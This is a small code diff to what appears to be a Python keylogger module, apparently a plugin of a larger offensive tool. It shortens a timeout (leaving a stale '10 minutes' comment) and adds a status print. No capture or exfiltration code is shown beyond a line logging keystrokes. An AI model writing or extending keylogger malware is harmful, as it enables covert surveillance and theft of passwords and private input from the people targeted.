@@ -4,7 +4,7 @@ from io import StringIO
 import time
 import sys
 
-TIMEOUT = 60 * 10  # 10 minutes
+TIMEOUT = 60  # 10 minutes
 
 class Keylogger:
     def __init__(self):
@@ -54,6 +54,7 @@ class Keylogger:
         self.log.write(key_str)
 
 def run(**args):
+    print("[*] In keylogger module.")
     kl = Keylogger()
     kl.get_current_process()  # Initialize first window
 
